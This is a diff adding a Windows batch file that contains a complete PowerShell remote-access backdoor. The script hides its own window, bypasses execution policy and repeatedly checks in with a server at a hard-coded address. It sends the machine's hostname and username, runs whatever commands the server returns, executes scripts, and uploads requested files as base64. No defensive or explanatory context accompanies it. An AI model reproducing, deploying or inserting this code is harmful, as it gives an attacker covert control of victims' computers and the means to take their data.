@@ -1,0 +1,15 @@
+@echo off
+
+:: Check if already running hidden
+if not "%1"=="hidden" (
+    powershell -WindowStyle Hidden -Command "Start-Process -WindowStyle Hidden -FilePath '%~f0' -ArgumentList 'hidden'"
+    exit
+)
+
+set SERVER_URL=http://10.77.86.28:5000
+
+:CONNECT
+powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference = 'SilentlyContinue'; $clientId = [System.Guid]::NewGuid().ToString(); $hostname = $env:COMPUTERNAME; $username = $env:USERNAME; $currentDir = (Get-Location).Path; while ($true) { try { $checkin = @{client_id=$clientId; hostname=$hostname; username=$username; cwd=$currentDir} | ConvertTo-Json; $response = Invoke-RestMethod -Uri '%SERVER_URL%/checkin' -Method Post -Body $checkin -ContentType 'application/json' -TimeoutSec 10; if ($response.command) { $cmd = $response.command; $output = ''; if ($cmd -eq 'KILL' -or $cmd -eq 'EXIT' -or $cmd -eq 'STOP') { $output = '[*] Client shutting down...'; $responseData = @{client_id=$clientId; output=$output; cmd_id=[System.Guid]::NewGuid().ToString(); cwd=$currentDir} | ConvertTo-Json; Invoke-RestMethod -Uri '%SERVER_URL%/response' -Method Post -Body $responseData -ContentType 'application/json' -TimeoutSec 5 | Out-Null; Start-Sleep -Seconds 1; exit; } try { if ($cmd.StartsWith('DOWNLOAD:')) { $filepath = $cmd.Substring(9).Trim(); if (Test-Path $filepath) { $bytes = [System.IO.File]::ReadAllBytes($filepath); $b64 = [Convert]::ToBase64String($bytes); $filename = Split-Path $filepath -Leaf; $uploadData = @{client_id=$clientId; filename=$filename; filedata=$b64} | ConvertTo-Json; Invoke-RestMethod -Uri '%SERVER_URL%/upload' -Method Post -Body $uploadData -ContentType 'application/json' | Out-Null; $output = '[+] File uploaded: ' + $filename; } else { $output = '[!] File not found: ' + $filepath; } } elseif ($cmd.StartsWith('EXECUTE:')) { $scriptPath = $cmd.Substring(8).Trim(); if (Test-Path $scriptPath) { $output = (& $scriptPath 2>&1 | Out-String); } else { $output = '[!] Script not found: ' + $scriptPath; } } elseif ($cmd.Trim().ToLower().StartsWith('cd ')) { $newDir = $cmd.Substring(3).Trim(); Set-Location $newDir -ErrorAction Stop; $currentDir = (Get-Location).Path; $output = '[+] Changed directory to: ' + $currentDir; } else { $output = (Invoke-Expression $cmd 2>&1 | Out-String); if ([string]::IsNullOrWhiteSpace($output)) { $output = '[*] Command executed'; } } $newDir = (Get-Location).Path; if ($newDir -ne $currentDir) { $currentDir = $newDir; } } catch { $output = '[!] Error: ' + $_.Exception.Message; } $responseData = @{client_id=$clientId; output=$output; cmd_id=[System.Guid]::NewGuid().ToString(); cwd=$currentDir} | ConvertTo-Json; Invoke-RestMethod -Uri '%SERVER_URL%/response' -Method Post -Body $responseData -ContentType 'application/json' | Out-Null; } Start-Sleep -Seconds 3; } catch { Start-Sleep -Seconds 5; } }"
+
+timeout /t 5 /nobreak >nul
+goto CONNECT
